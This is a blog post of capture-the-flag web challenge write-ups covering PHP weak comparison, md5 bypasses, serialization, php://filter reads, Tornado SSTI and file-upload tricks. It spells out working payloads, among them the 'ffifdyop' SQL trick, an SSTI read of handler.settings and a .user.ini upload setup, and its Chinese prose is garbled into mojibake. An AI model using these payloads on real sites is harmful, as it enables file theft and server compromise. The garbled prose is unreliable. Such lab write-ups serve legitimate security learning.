<p>%00æ˜¯å¯¹è±¡åºåˆ—åŒ–åä¸å¯è§å­—ç¬¦å¯¹åº”çš„urlç¼–ç ï¼Œå¦‚æœç›´æ¥å°†åºåˆ—åŒ–ç»“æœå¤åˆ¶æµè§ˆå™¨ä¸­ï¼Œå› ä¸ºå­—ç¬¦ä¸å¯è§æ‰€ä»¥ä¼šå˜æˆç©ºæ ¼ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦æ‰‹åŠ¨åŠ ä¸Šè¿™ä¸ª%00</p>
</blockquote>
<p><del>å¥½å§ç»ˆäºçŸ¥é“å›¾ä¸­ä¸æ˜å­—ç¬¦äº†</del><br>?select=O:4:â€Nameâ€:3:{s:14:â€%00Name%00usernameâ€;s:5:â€adminâ€;s:14:â€%00Name%00passwordâ€;i:100;}</p>
<hr>
<h3 id="ACTF2020-æ–°ç”Ÿèµ›-BackupFile1"><a href="#ACTF2020-æ–°ç”Ÿèµ›-BackupFile1" class="headerlink" title="[ACTF2020 æ–°ç”Ÿèµ›]BackupFile1"></a>[ACTF2020 æ–°ç”Ÿèµ›]BackupFile1</h3><p><img src="https://pick.lwzheng.tech/2025/01/14/67865bfc2411e.png" alt="d6269676d01904af0f453fddb1fb6814.png"><br><a href="https://">https://www.runoob.com/php/php-is_numeric-function.html</a><br><a href="https://">https://www.runoob.com/php/php-intval-function.html</a></p>
<pre class="line-numbers language-none"><code class="language-none">ã€Š?php
include_once "flag.php";

if(isset($_GET['key'])) 
{
    $key = $_GET['key'];
    if(!is_numeric($key)) #is_numeric() å‡½æ•°ç”¨äºæ£€æµ‹å˜é‡æ˜¯å¦ä¸ºæ•°å­—æˆ–æ•°å­—å­—ç¬¦ä¸²ã€‚
    {
        exit("Just num!");
    }
    $key = intval($key);#intval() å‡½æ•°ç”¨äºè·å–å˜é‡çš„æ•´æ•°å€¼ã€‚
    $str = "123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3";
    if($key == $str) {
        echo $flag;
    }
}
else {
    echo "Try to find out source file!";
}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>åœ¨PHPä¸­ï¼š<br>== ä¸ºå¼±ç›¸ç­‰ï¼Œå³å½“æ•´æ•°å’Œå­—ç¬¦ä¸²ç±»å‹ç›¸æ¯”è¾ƒæ—¶ã€‚ä¼šå…ˆå°†å­—ç¬¦ä¸²è½¬åŒ–ä¸ºæ•´æ•°ç„¶åå†è¿›è¡Œæ¯”è¾ƒã€‚æ¯”å¦‚a=123å’Œb=123admin456è¿›è¡Œ==æ¯”è¾ƒæ—¶ã€‚åˆ™båªä¼šæˆªå–å‰é¢çš„æ•´æ•°éƒ¨åˆ†ã€‚å³bè½¬åŒ–æˆ123ã€‚<br><code>?key=123</code></p>
<hr>
<h3 id="BJDCTF2020-Easy-MD51"><a href="#BJDCTF2020-Easy-MD51" class="headerlink" title="[BJDCTF2020]Easy MD51"></a>[BJDCTF2020]Easy MD51</h3><p><del>ä¸æ˜¯æºä»£ç çš„copyè€…ï¼Œåªæ˜¯æºä»£ç çš„æ¬è¿å·¥ã€‚ã€‚ã€‚</del><br><a href="https://">https://www.runoob.com/php/func-filesystem-file-get-contents.html</a><br><a href="https://">https://www.iteye.com/blog/jun1986-1176909</a></p>
<pre class="line-numbers language-none"><code class="language-none">ã€Š?php
header('hint:select * from \'admin\' where password='.'md5($pass,true)');
?&gt;
ã€Š?php
error_reporting(0);
$password = $_GET['password'];

if($password == 'ffifdyop')#çœ‹è§==ï¼Œä¼¼ä¹çŸ¥é“è¦è€ƒå¼±ç±»å‹ã€‚ã€‚ã€‚
{
    echo "&lt;script&gt;window.location.replace('./levels91.php')&lt;/script&gt;";#window.location.replace(â€œurlâ€)ï¼šå°†åœ°å€æ›¿æ¢æˆæ–°urlï¼Œè¯¥æ–¹æ³•é€šè¿‡æŒ‡å®šURLæ›¿æ¢å½“å‰ç¼“å­˜åœ¨å†å²é‡Œï¼ˆå®¢æˆ·ç«¯ï¼‰çš„é¡¹ç›®ï¼Œ
}

?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-none"><code class="language-none">ã€Š?php
error_reporting(0);
$a = $_GET['a'];
$b = $_GET['b'];

if($a != $b &amp;&amp; md5($a) == md5($b))#çœ‹è§==ï¼Œä¼¼ä¹çŸ¥é“è¦è€ƒå¼±ç±»å‹ã€‚ã€‚ã€‚
{
    echo "&lt;script&gt;window.location.replace('./levell14.php')&lt;/script&gt;";
}
?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="https://pick.lwzheng.tech/2025/01/16/6787e1522f1ff.png" alt="7d1a019efadddab9ceae5ab701ab76fe.png"><br><del>å”‰ï¼Œçˆ†äº†çˆ†äº†</del>ï¼Œ=ã€‹glzjin<a href="https://">https://github.com/glzjin</a></p>
<pre class="line-numbers language-none"><code class="language-none">ã€Š?php
error_reporting(0);
include "flag.php";

highlight_file(__FILE__);

if($_POST['param1']!==$_POST['param2']&amp;&amp;md5($_POST['param1'])===md5($_POST['param2'])){
    echo $flag;
}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><del>æ­¤æ—¶æˆ‘æ‰æ„è¯†åˆ°ä¸è¯¥çœ‹æºä»£ç çš„ï¼Œç›¸å½“äºçœ‹wpäº†ï¼Œæˆ‘åˆåˆåˆåˆå¿˜äº†ï¼ˆå“­</del><br><del>å¥½å§å°±å½“æˆ‘ä»€ä¹ˆä¹Ÿæ²¡çœ‹åˆ°ï¼ˆ</del><br>burpæ‰¾åˆ°çš„<br><img src="https://pick.lwzheng.tech/2025/01/16/678861c433699.png" alt="372588dbab00b81c163759fc1c782888.png"><br><a href="https://">https://www.w3school.com.cn/php/func_string_md5.asp</a><br>md5=ã€‹ä¸ºâ€™ â€˜ or 1(true)å³å¯é€šè¿‡<br>åœ¨mysqlé‡Œé¢ï¼Œåœ¨ç”¨ä½œå¸ƒå°”å‹åˆ¤æ–­æ—¶ï¼Œä»¥1å¼€å¤´çš„å­—ç¬¦ä¸²ä¼šè¢«å½“åšæ•´å‹æ•°ã€‚<br>è¦æ³¨æ„çš„æ˜¯è¿™ç§æƒ…å†µæ˜¯å¿…é¡»è¦æœ‰å•å¼•å·æ‹¬èµ·æ¥çš„ï¼Œæ¯”å¦‚password=â€˜xxxâ€™ or â€˜1xxxxxxxxxâ€™ï¼Œé‚£ä¹ˆå°±ç›¸å½“äºpassword=â€˜xxxâ€™ or 1 ï¼Œä¹Ÿå°±ç›¸å½“äºpassword=â€˜xxxâ€™ or trueï¼Œæ‰€ä»¥è¿”å›å€¼å°±æ˜¯trueã€‚<br>å¸ƒå°”å€¼ï¼šå¸ƒå°”å€¼&nbsp;false&nbsp;æœ¬èº«ä¸ºå‡ã€‚<br>æ•´æ•°ï¼šå€¼ä¸º&nbsp;0&nbsp;çš„æ•´æ•°è¢«è§†ä¸º&nbsp;false&nbsp;ï¼Œä¾‹å¦‚&nbsp;0&nbsp;ã€&nbsp;0.0&nbsp;ï¼ˆå› ä¸ºåœ¨æ¯”è¾ƒæ—¶&nbsp;0.0&nbsp;ä¼šè¢«è½¬æ¢ä¸ºæ•´æ•°&nbsp;0&nbsp;ï¼‰ã€‚<br>ç©ºå­—ç¬¦ä¸²ï¼š&nbsp;â€œâ€&nbsp;ï¼ˆåŒå¼•å·ï¼‰æˆ–è€…&nbsp;â€˜â€™&nbsp;ï¼ˆå•å¼•å·ï¼‰ç©ºå­—ç¬¦ä¸²ä¸ºå‡ã€‚<br>ç©ºæ•°ç»„ï¼š&nbsp;array()&nbsp;æˆ–è€…&nbsp;[]&nbsp;è¡¨ç¤ºçš„ç©ºæ•°ç»„è¢«åˆ¤å®šä¸º&nbsp;false&nbsp;ã€‚<br>ç‰¹æ®Šç±»å‹å€¼ï¼š&nbsp;null&nbsp;å’Œ&nbsp;undefined&nbsp;ï¼ˆåœ¨PHPä¸¥æ ¼æ¨¡å¼ä¸‹æ²¡æœ‰çœŸæ­£çš„&nbsp;undefined&nbsp;ï¼Œä¸è¿‡åœ¨ä¸€äº›æ¯”è¾ƒå®½æ¾çš„æƒ…å†µä¸‹å¯ä»¥ç±»ä¼¼ç†è§£ï¼‰è¢«åˆ¤å®šä¸º&nbsp;false&nbsp;ã€‚<br>æœªåˆå§‹åŒ–çš„å˜é‡ï¼šåœ¨ä¸€äº›æƒ…å†µä¸‹ï¼Œæœªåˆå§‹åŒ–çš„å˜é‡å¦‚æœåœ¨æ¡ä»¶åˆ¤æ–­ä¸­ä½¿ç”¨ï¼Œä¼šå‘å‡ºè­¦å‘Šå¹¶ä¸”è¢«è§†ä¸º&nbsp;false&nbsp;ã€‚<br>å…¶ä»–æƒ…å†µä¸€èˆ¬éƒ½è¢«åˆ¤å®šä¸º&nbsp;true<br>åªè¦â€™orâ€™åé¢çš„å­—ç¬¦ä¸²ä¸ºä¸€ä¸ªéé›¶çš„æ•°å­—å¼€å¤´éƒ½ä¼šè¿”å›True<br>å·çš„è„šæœ¬</p>
<pre class="line-numbers language-none"><code class="language-none">ã€Š?php
for ($i = 0;;) {
    for ($c = 0; $c &lt; 1000000; $c++, $i++)
        if (stripos(md5($i, true), '\'or\'') !== false)#stripos() å‡½æ•°æŸ¥æ‰¾å­—ç¬¦ä¸²åœ¨å¦ä¸€å­—ç¬¦ä¸²ä¸­ç¬¬ä¸€æ¬¡å‡ºç°çš„ä½ç½®ï¼ˆä¸åŒºåˆ†å¤§å°å†™ï¼‰æ‰¾ä¸€ä¸‹orå“ˆ
            echo "\nmd5($i) = " . md5($i, true) . "\n";
    echo ".";
}
?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>æ‰¾åˆ°ä¸€ä¸ª<br><img src="https://pick.lwzheng.tech/2025/01/16/67887746f3929.png" alt="605c2ccf2407e4c907602cdff46897c8.png"><br>ä½†ä»æºä»£ç <code>if($password == 'ffifdyop')</code>æ¥çœ‹å·²ç»å®šæ­»äº†ffifdyopï¼ˆå”‰ï¼Œå®šåˆ¶<br><del>ä¼°è®¡å‡ºé¢˜äººæƒ³çš„æ˜¯ç‰¹ä¾‹ç§’äº†æ²¡æƒ³åˆ°ä¼šæœ‰æ†¨æ†¨çœŸçš„ä¸€ä¸ªä¸€ä¸ªæ‰¾</del><br>è¿™æ˜¯â€ffifdyopâ€md5å<br><img src="https://pick.lwzheng.tech/2025/01/16/678878af4544a.png" alt="dbe8bbbaaee382b724bb08151d262e0d.png"><br>ç„¶åè€ƒmd5ç¢°æ’<br><a href="https://">https://blog.csdn.net/qq_64201116/article/details/126493091</a><del>(å”‰å·²ç»æœ‰å‰äººæ ½æ ‘äº†</del></p>
<blockquote>
<p>å­—ç¬¦ä¸²ä¹‹é—´è¿›è¡Œæ¯”è¾ƒï¼Œæƒ³è¦ç»•è¿‡è¿™ä¸ªå¼±æ¯”è¾ƒåªèƒ½ç”¨0eçš„æ–¹å¼ã€‚åœ¨PHPä¸­â€0eâ€åˆ¤æ–­ä¸ºç§‘å­¦è®¡æ•°æ³•ï¼Œ0e123å°±æ˜¯0çš„10123æ¬¡æ–¹ï¼Œä¸éš¾æ¨å‡ºï¼š0e123456789==0e1 // å› ä¸º0çš„ä»»æ„æ¬¡æ–¹éƒ½ä¸º0ã€‚åœ¨0eåé¢ä¸èƒ½å«æœ‰å­—æ¯ï¼ï¼ï¼å¦åˆ™åˆ¤æ–­ä¸ºFalse<br>éšä¾¿é€‰å‡ ä¸ªå°±è¡Œäº†</p>
</blockquote>
<pre class="line-numbers language-none"><code class="language-none">?
a=MMHUWUV&amp;
b=MAUXXQC<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<blockquote>
<p>md5_1[]=1&amp;md5_2[]=2<br>å› ä¸ºPHPå¯¹æ— æ³•md5åŠ å¯†çš„ä¸œè¥¿ä¸åŠ å¯†ï¼Œç»“æœä¸ºNULLï¼Œè™½ç„¶ä¼šæŠ¥é”™ï¼Œä½†æ˜¯null=nullï¼Œé€»è¾‘å…³ç³»ä¸ºTrueã€‚æ‰€ä»¥å¯ä»¥è¾“å‡ºflag<br>å”‰è‡ªå·±æçš„hackbarçš„æ’ä»¶çœŸæ˜¯ä¸å¥½ç”¨ï¼Œå¥½å‡ æ¬¡postéƒ½ä¸è¡Œï¼Œæœ€åç”¨çš„burpsuitã€‚å¤§å®¶è¿˜æ˜¯ç”¨ç«ç‹çš„hackbarå§<br><img src="https://pick.lwzheng.tech/2025/01/16/6788822eb58c6.png" alt="bdc102e6223dabb4ac703c4748781ed6.png"></p>
</blockquote>
<hr>
<h3 id="MRCTF2020-ä½ ä¼ ä½ ğŸå‘¢1"><a href="#MRCTF2020-ä½ ä¼ ä½ ğŸå‘¢1" class="headerlink" title="[MRCTF2020]ä½ ä¼ ä½ ğŸå‘¢1"></a>[MRCTF2020]ä½ ä¼ ä½ ğŸå‘¢1</h3><p><del><em>å¼€å¹•é¬¼å›¾ã€‚ã€‚ã€‚</em></del><br>ç”¨repeaterè¯•äº†ä¸€ä¸‹ï¼ŒçŒœæµ‹å¯èƒ½æ˜¯å°¾éƒ¨ä¸èƒ½æœ‰phpã€‚ä¸”Content-Typeéœ€ä¸ºpng/jpegã€‚ã€‚ã€‚<br><strong>Q</strong>:ç”¨aspï¼Œä½†å¥½åƒè¯•äº†ä¸€ä¸‹ä¸è¡Œã€‚<br><img src="https://pick.lwzheng.tech/2025/01/16/6788cd12953ec.png" alt="72005344cc19cb2fd346af3175db3dce.png"><br>çŒœæµ‹æ˜¯aspæ²¡è¢«è§£æï¼ˆæ˜¯å—ï¼Ÿ<br>ç„¶åç”¨äº†.htaccessï¼Œæ”¹ä¸€ä¸‹Content-Typeè®¿é—®å³å¯ã€‚<br>è¿˜æœ‰å°±æ˜¯ä¸è¦è®¿é—®/var/www/html/upload/f46c7557e25c244fb27f31414303dcf9/pass.png è€Œæ˜¯upload/f46c7557e25c244fb27f31414303dcf9/pass.pngã€‚</p>
<hr>
<h3 id="ZJCTF-2019-NiZhuanSiWei1"><a href="#ZJCTF-2019-NiZhuanSiWei1" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei1"></a>[ZJCTF 2019]NiZhuanSiWei1</h3><p><a href="https://">https://www.runoob.com/php/php-preg_match.html</a></p>
<pre class="line-numbers language-none"><code class="language-none">ã€Š?php  
$text = $_GET["text"];
$file = $_GET["file"];
$password = $_GET["password"];
if(isset($text)&amp;&amp;(file_get_contents($text,'r')==="welcome to the zjctf")){#éœ€è¦ä¸€ä¸ªtxtæ–‡ä»¶
    echo "&lt;br&gt;&lt;h1&gt;".file_get_contents($text,'r')."&lt;/h1&gt;&lt;/br&gt;";
    if(preg_match("/flag/",$file)){#æŸ¥æ‰¾æ˜¯å¦æœ‰"flag"
        echo "Not now!";
        exit(); 
    }else{
        include($file);  //useless.php
        $password = unserialize($password);
        echo $password;
    }
}
else{
    highlight_file(__FILE__);
}
?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><code>?text=file://D:\Desktop\ctf\ctf\buuctf\welcome to the zjctf.txt</code>ä¸è¡Œ<br><a href="https://">https://www.cnblogs.com/zzjdbk/p/13030717.html</a><br><a href="https://">https://www.php.net/manual/zh/wrappers.data.php</a><br><img src="https://pick.lwzheng.tech/2025/01/16/6788e906d0a65.png" alt="6181f5b97cc3a19e68afb5284cb03a94.png"><br><code>?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=</code><br>çœ‹ä¸è§çš„useless.phpç©¶ç«Ÿæ˜¯ä½•æ–¹ç¥åœ£ã€‚ã€‚ã€‚<br><code>&amp;file=php://filter/read=convert.base64-encode/resource=useless.php</code></p>
<pre class="line-numbers language-none"><code class="language-none">ã€Š?php  

class Flag{  //flag.php  
    public $file;  
    public function __tostring(){  #__toString() æ–¹æ³•ç”¨äºä¸€ä¸ªç±»è¢«å½“æˆå­—ç¬¦ä¸²æ—¶åº”æ€æ ·å›åº”ã€‚ä¾‹å¦‚ echo $obj; åº”è¯¥æ˜¾ç¤ºäº›ä»€ä¹ˆã€‚
        if(isset($this-&gt;file)){  
            echo file_get_contents($this-&gt;file); 
            echo "&lt;br&gt;";
        return ("U R SO CLOSE !///COME ON PLZ");
        }  
    }  
}  
?&gt;  
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><a href="https://">https://www.php.net/manual/zh/language.oop5.magic.php#object.tostring</a></p>
<blockquote>
<p>åœ¨ PHP ç¼–ç¨‹ä¸­ï¼Œæ˜¯ä¸èƒ½ç”¨echoè¯­å¥ç›´æ¥è¾“å‡ºä¸€ä¸ªå¯¹è±¡çš„ï¼Œä¹Ÿä¸èƒ½ç”¨å­—ç¬¦ä¸²è¿æ¥ç¬¦ (.) æ‹¼æ¥ä¸€ä¸ªå¯¹è±¡<br>è¦æƒ³è¾“å‡ºçš„è¯ï¼Œå°±è¦æŠŠå®ä½“å¯¹è±¡è½¬æ¢æˆå­—ç¬¦ä¸²ï¼Œè¿™ä¹Ÿæ­£æ˜¯__tostringå‡½æ•°çš„æ„ä¹‰æ‰€åœ¨ã€‚</p>
</blockquote>
<pre class="line-numbers language-none"><code class="language-none">$password=new Flag;
echo $password;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>ä½†æ˜¾ç¤ºâ€œmust return a string value inâ€<br>æƒ³åˆ°passwordä¼šunserializeä¸€æ¬¡ï¼Œserializeåæ­£æ˜¯å­—ç¬¦ä¸²ï¼ŒtoString() æ–¹æ³•ç”¨äºä¸€ä¸ªç±»è¢«å½“æˆå­—ç¬¦ä¸²æ—¶åº”æ€æ ·å›åº”<del>ï¼ˆå¥½å·§</del></p>
<pre class="line-numbers language-none"><code class="language-none">ã€Š?php

class Flag{  //flag.php
public $file='flag.php';
public function __tostring(){  #__toString() æ–¹æ³•ç”¨äºä¸€ä¸ªç±»è¢«å½“æˆå­—ç¬¦ä¸²æ—¶åº”æ€æ ·å›åº”ã€‚ä¾‹å¦‚ echo $obj; åº”è¯¥æ˜¾ç¤ºäº›ä»€ä¹ˆã€‚
if(isset($this-&gt;file)){
echo file_get_contents($this-&gt;file);
echo "&lt;br&gt;";
return ("U R SO CLOSE !///COME ON PLZ");
}
}
}
$password=new Flag;
$password=serialize($password);
echo $password;
?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>æ€ä¹ˆè¿èµ·æ¥å‘¢ï¼Ÿç”¨<code>include($file)</code>ï¼Œå°†useless.phpç”¨èµ·æ¥ã€‚ã€‚ã€‚<br><code>?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=useless.php&amp;password=O:4:"Flag":1:{s:4:"file";s:8:"flag.php";}</code><br>oh u find it,åœ¨æºä»£ç é‡Œã€‚</p>
<hr>
<p><del>å°è¶£äº‹å‰§åœº</del><br>ç¬¬ä¸€æ¬¡å¿˜ç»™åŠ flag.phpå¼•å·äº†ï¼Œç„¶åå¾—åˆ°flagphp<br><code>?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=useless.php&amp;password=O:4:"Flag":1:{s:4:"file";s:7:"flagphp";}</code><br>äºæ˜¯ï¼š<code>U R SO CLOSE !///COME ON PLZ</code><br><del>å¾ˆå¥½ï¼Œçœ‹åˆ°è¿™ä¸ªæ—¶äººéƒ½ä¸å¥½äº†</del></p>
<hr>
<h3 id="æŠ¤ç½‘æ¯-2018-easy-tornado1"><a href="#æŠ¤ç½‘æ¯-2018-easy-tornado1" class="headerlink" title="[æŠ¤ç½‘æ¯ 2018]easy_tornado1"></a>[æŠ¤ç½‘æ¯ 2018]easy_tornado1</h3><pre class="line-numbers language-none"><code class="language-none">/flag.txt
flag in /fllllllllllllag
/welcome.txt
render
/hints.txt
md5(cookie_secret+md5(filename))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><del>æ ‡é¢˜æ˜¯é¾™å·é£</del><br><a href="https://">https://www.osgeo.cn/tornado/template.html</a></p>
<blockquote>
<pre class="line-numbers language-none"><code class="language-none">tornado renderæ˜¯pythonä¸­çš„ä¸€ä¸ªæ¸²æŸ“å‡½æ•°ï¼Œä¹Ÿå°±æ˜¯ä¸€ç§æ¨¡æ¿ï¼Œé€šè¿‡è°ƒç”¨çš„å‚æ•°ä¸åŒï¼Œç”Ÿæˆä¸åŒçš„ç½‘é¡µ
RequestHandler.render(template_name: str, **kwargs: Any)â†’ Future[None][æºä»£ç ]Â¶
ä»¥ç»™å®šå‚æ•°ä½œä¸ºå“åº”å‘ˆç°æ¨¡æ¿ã€‚
enderæ˜¯pythonçš„ä¸€ä¸ªæ¸²æŸ“å‡½æ•°ï¼Œä»–ä»¬çš„urléƒ½æ˜¯ç”±filenameå’Œfilehashç»„æˆï¼Œfilehashå³ä¸ºä»–ä»¬filenameçš„md5å€¼ã€‚
Tornadoæ¨¡æ¿æ”¯æŒ æ§åˆ¶è¯­å¥ å’Œ è¡¨è¾¾ . æ§åˆ¶è¯­å¥è¢«åŒ…å›´ {{% å’Œ %}} ï¼Œä¾‹å¦‚ {{% if len(items) &gt; 2 %}} . è¡¨è¾¾å¼è¢«åŒ…å›´ {{{{ å’Œ }}}} ï¼Œä¾‹å¦‚ {{{{ items[0] }}}} .<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

</blockquote>
<p><del>ã€‚ã€‚ã€‚ä¸æ˜¯ï¼Œè¿™ç»™æˆ‘å¹²å“ªå„¿äº†</del><br><a href="https://">https://www.cnblogs.com/-chenxs/p/11971164.html</a><br>ã€‚ã€‚ã€‚å¥½å§ï¼ŒXXSå£«åˆ«ä¸‰æ—¥å½“åˆ®ç›®ç›¸çœ‹ï¼ˆ<br><a href="https://">https://blog.csdn.net/miuzzx/article/details/123329244</a><br><del>å”‰é¾™å·é£çš„å®åŠ›</del><br><a href="https://">https://www.cnblogs.com/bmjoker/p/13508538.html</a><br><del>æ„Ÿæƒ…ç°åœ¨æ‰çŸ¥é“æ˜¯è€ƒSSTI(å¥½å§æˆ‘æ˜¯ç¬¬ä¸€æ¬¡å¬è¿™ä¸ªä¸œè¥¿</del><br><a href="https://">https://www.cnblogs.com/cimuhuashuimu/p/11544455.html</a><br>æ‰¾åˆ°äº†~<br>ä¸æ˜¯ï¼Œæƒ³çœ‹çœ‹é¾™å·é£çš„SSTIç»“æœå‘ç°é¾™å·é£çš„å”¯ä¸€ä¾‹å­å°±æ˜¯ä»è¿™é“é¢˜å–å¾—å•Š<del>ï¼ˆå°ä¼—å®è—æ¨¡æ¿å®é”¤äº†</del><br><img src="https://pick.lwzheng.tech/2025/01/16/6789255875e3a.png" alt="83e80f39bdc56c99964045d59a0303c1.png"><br>åœ¨è¿™é‡Œæ”¹ä¸€ä¸‹filehashåå¾—åˆ°errorç•Œé¢<br><img src="https://pick.lwzheng.tech/2025/01/16/6789259d5b990.png" alt="ec88202d1c253015146f2f861622ed36.png"><br>ä¸Šæ–¹é“¾æ¥è¯´å¾—å°±ä¸èµ˜è¿°äº†<br><code>error?msg={{handler.settings}}</code><br>AIçœŸæ˜¯æ™ºèƒ½ï¼Œæµ…æµ…è®©å®ƒæ”¹æ”¹è¯­æ³•æ¼æ´ç™¾å‡ºçš„pythonè„šæœ¬ï¼ˆdbqæˆ‘ä¼šåŠªåŠ›çš„</p>
<pre class="line-numbers language-none"><code class="language-none">import hashlib

filename = '/fllllllllllllag'
cookie_secret = 'fb5a8768-2485-4575-a5c6-f336fae93f01'
# å°†æ–‡ä»¶åç¼–ç ä¸ºå­—èŠ‚ç±»å‹
filename_bytes = filename.encode('utf-8')
mid = hashlib.md5(filename_bytes)
# è·å–åå…­è¿›åˆ¶å“ˆå¸Œå€¼
mid_hex = mid.hexdigest()
result = cookie_secret + mid_hex
# å¯¹æ‹¼æ¥åçš„ç»“æœè®¡ç®—MD5å“ˆå¸Œå€¼
final_hash = hashlib.md5(result.encode('utf-8'))
print(final_hash.hexdigest())
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>å…¶å®è¿™æ¬¡payloadåœ¨åŸurlä¸Šæ”¹æŒºæ–¹ä¾¿çš„ã€‚ã€‚ã€‚<br><code>?filename=/fllllllllllllag&amp;filehash=b52ee6e6b21e8ce79913379fd4aeb5e2</code></p>
<hr>
<h3 id="MRCTF2020-Ez-bypass1"><a href="#MRCTF2020-Ez-bypass1" class="headerlink" title="[MRCTF2020]Ez_bypass1"></a>[MRCTF2020]Ez_bypass1</h3><p>æ€ä¹ˆè¿™ä¹ˆå¤šmd5â€¦</p>
<pre class="line-numbers language-none"><code class="language-none">if(isset($_GET['gg'])&amp;&amp;isset($_GET['id'])) {
    $id=$_GET['id'];
    $gg=$_GET['gg'];
    if (md5($id) === md5($gg) &amp;&amp; $id !== $gg) {
        echo 'You got the first step';<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><code>?gg[]=1&amp;id[]=2</code></p>
<pre class="line-numbers language-none"><code class="language-none">if(isset($_POST['passwd'])) {
            $passwd=$_POST['passwd'];
            if (!is_numeric($passwd))#å¦‚æœæŒ‡å®šçš„å˜é‡æ˜¯æ•°å­—å’Œæ•°å­—å­—ç¬¦ä¸²åˆ™è¿”å› TRUEï¼Œå¦åˆ™è¿”å› FALSE
            {
                 if($passwd==1234567)
                 {
                     echo 'Good Job!';
                     highlight_file('flag.php');
                     die('By Retr_0');<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><code>passwd=1234567ab</code></p>
<hr>
<h3 id="SUCTF-2019-CheckIn1"><a href="#SUCTF-2019-CheckIn1" class="headerlink" title="[SUCTF 2019]CheckIn1"></a>[SUCTF 2019]CheckIn1</h3><p><a href="https://">https://www.freebuf.com/articles/web/287193.html</a><br>å…ˆè¯•äº†è¯•ï¼Œä¸Šä¼ æœ¨é©¬åˆ°æ˜¯æ­£å¸¸æ–¹æ³•ç»•è¿‡å³å¯ï¼ˆ%00ä¹Ÿè¯•è¿‡å´ä¸å¯ï¼‰ï¼Œä½†å‘ç°ä¸Šä¼  .htaccess æƒ³åŠ GIF89aï¼Œä½†åˆä¸èƒ½åŠ ã€‚ã€‚ã€‚<br><img src="https://pick.lwzheng.tech/2025/01/18/678b99a87bd74.png" alt="60b35f867b5571edfe827aea70dc157d.png"><br>.htaccessçš„é…ç½®æ–‡ä»¶åªèƒ½åœ¨ApacheæœåŠ¡å™¨ä¸­èµ·ä½œç”¨ï¼ˆå“­</p>
<blockquote>
<p>èƒ½å¤Ÿåˆ©ç”¨.user.iniçš„æ¡ä»¶ï¼š<br>æœåŠ¡å™¨è„šæœ¬è¯­è¨€ä¸ºPHP æœåŠ¡å™¨ä½¿ç”¨CGI<br>FastCGIæ¨¡å¼<br>ä¸Šä¼ ç›®å½•ä¸‹è¦æœ‰å¯æ‰§è¡Œçš„phpæ–‡ä»¶</p>
<pre class="line-numbers language-none"><code class="language-none">auto_prepend_file = &lt;filename&gt;         //åŒ…å«åœ¨æ–‡ä»¶å¤´
auto_append_file = &lt;filename&gt;          //åŒ…å«åœ¨æ–‡ä»¶å°¾<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>auto_append_fileã€auto_prepend_file<br>æŒ‡å®šä¸€ä¸ªæ–‡ä»¶ï¼Œè‡ªåŠ¨åŒ…å«åœ¨è¦æ‰§è¡Œçš„æ–‡ä»¶å‰ï¼Œç±»ä¼¼äºåœ¨æ–‡ä»¶å‰è°ƒç”¨äº†require()å‡½æ•°ã€‚è€Œauto_append_fileç±»ä¼¼ï¼Œåªæ˜¯åœ¨æ–‡ä»¶åé¢åŒ…å«ã€‚</p>
</blockquote>
<pre class="line-numbers language-none"><code class="language-none">GIF89a
auto_prepend_file=pass.gif<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
